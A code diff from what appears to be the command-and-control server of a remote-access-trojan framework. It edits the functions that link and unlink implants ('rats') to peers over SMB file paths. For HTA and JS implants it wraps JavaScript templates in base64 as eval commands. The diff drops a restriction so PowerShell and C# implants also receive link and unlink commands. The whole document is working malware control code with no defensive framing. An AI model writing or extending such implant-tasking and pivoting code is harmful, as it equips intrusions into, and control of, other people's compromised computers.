@@ -317,42 +317,49 @@ def send_ratcode(ratID=None, ratType=None, ip_addr=None):
     return(ratcode)
 
 def link_smb(ratID, filepath): # returns eval data for rat and registers link dict
-    if(types[ratID] == "ps1" or types[ratID] == "c#"):
-        pretty_print("[!] Link is not supported for PS1 or C# rats")
-        return
 
     if("None" in links[ratID]):
         links[ratID].remove('None')
     links[ratID].append(filepath)
 
-    with open(os.getcwd() + "/resources/smb_link.js", "r") as fd:
-        smb_link_data = fd.read()
-    with open(os.getcwd() + "/resources/run_extra.js", "r") as fd:
-        run_extra_data = fd.read()
-    
-    smb_link_data = smb_link_data.replace("~~FILEPATH~~", filepath.replace("\\", "\\\\"))
-    smb_link_data = base64.b64encode(smb_link_data.encode('utf-8')).decode('utf-8')
-
-    run_extra_data = run_extra_data.replace("~~EXTRAB64~~", smb_link_data)
-
     pretty_print("[*] Linking " + colors(ratID) + " to peer rat over SMB file path: " + filepath)
-    return "ev " + base64.b64encode(run_extra_data.encode('utf-8')).decode('utf-8')
+
+    if(types[ratID] == "hta" or types[ratID] == "js"):
+        with open(os.getcwd() + "/resources/smb_link.js", "r") as fd:
+            smb_link_data = fd.read()
+        with open(os.getcwd() + "/resources/run_extra.js", "r") as fd:
+            run_extra_data = fd.read()
+        
+        smb_link_data = smb_link_data.replace("~~FILEPATH~~", filepath.replace("\\", "\\\\"))
+        smb_link_data = base64.b64encode(smb_link_data.encode('utf-8')).decode('utf-8')
+
+        run_extra_data = run_extra_data.replace("~~EXTRAB64~~", smb_link_data)
+
+        return "ev " + base64.b64encode(run_extra_data.encode('utf-8')).decode('utf-8')
+    else: # Rat must be C# or PS1
+        return "li " + filepath
 
 def unlink_smb(ratID, filepath):
     if filepath == "all":
         links[ratID] = ["None"]
-        return "ev " + encode_file(os.getcwd() + "/resources/smb_unlink_all.js")
-    
-    with open(os.getcwd() + "/resources/smb_unlink.js", "r") as fd:
-        smb_unlink_data = fd.read()
-    smb_unlink_data = smb_unlink_data.replace("~~FILEPATH~~", filepath.replace("\\", "\\\\\\\\")) # replace \ with \\\\ since we also account for meta-programming
+        if(types[ratID] == "hta" or types[ratID] == "js"):
+            return "ev " + encode_file(os.getcwd() + "/resources/smb_unlink_all.js")
+        else:
+            return "ul all"
+    if(types[ratID] == "hta" or types[ratID] == "js"):
+        with open(os.getcwd() + "/resources/smb_unlink.js", "r") as fd:
+            smb_unlink_data = fd.read()
+        smb_unlink_data = smb_unlink_data.replace("~~FILEPATH~~", filepath.replace("\\", "\\\\\\\\")) # replace \ with \\\\ since we also account for meta-programming
 
-    if(filepath in links[ratID]):
-        links[ratID].remove(filepath)
-        if(not links[ratID]):
-            links[ratID] = ["None"]
+        if(filepath in links[ratID]):
+            links[ratID].remove(filepath)
+            if(not links[ratID]):
+                links[ratID] = ["None"]
+        
+        return "ev " + base64.b64encode(smb_unlink_data.encode('utf-8')).decode('utf-8')
     
-    return "ev " + base64.b64encode(smb_unlink_data.encode('utf-8')).decode('utf-8')
+    else: # PS1 or C#
+        return "ul " + filepath
 
 def encode_file(filepath):
     with open(Path(filepath).resolve() , "rb") as fd:
